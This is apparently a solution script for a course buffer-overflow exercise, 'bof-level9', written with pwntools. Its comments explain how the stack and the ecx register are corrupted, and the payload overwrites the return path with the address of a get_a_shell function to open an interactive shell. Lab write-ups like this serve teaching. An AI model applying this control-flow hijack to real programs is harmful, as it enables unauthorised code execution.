# week2-bof-level9 
#!/usr/bin/env python                                                            
                                                                                    
from pwn import *                                                                
                                                                                    
# create process and run the program                                             
p = process("./bof-level9")                                                      
                                                                                    
e = ELF('./bof-level9')                                                          
get_a_shell = e.symbols['get_a_shell']                                           
print(hex(get_a_shell))

#First, we know this StdIn can max to 192bytes, and we set the breakpoint in main+86 to see what happened in main.
#we found that buffer start from 0xffffd488, and the value of [ebp-0x4] would be the addr of %ecx
#so we change the value of [ebp-0x4] to 0xffffd490, so $ecx point to 0xffffd490, and in main+103 we know that it would return the value of $ecx-0x4, 
#so we change the value be the addr of get_a_shell(), then we got the get_a_shell.

#First solution
#buf1 = p32(get_a_shell) + "AAAAAAAAAAAA"                                        
#buf = "AAAA" + buf1 * 7 + "AAAAAAAA" + p32(0xffffd490)                          

#Second solution  
#we dont know where the ecx would be now because the start position is changed, so we change all the value be the addr of get_a_shell()
buf = "AAAA" + p32(get_a_shell) * 30 + p32(0xffffd490)                                    
                                                                                
p.sendline(buf)                                                                  
                                                                                   
p.interactive() 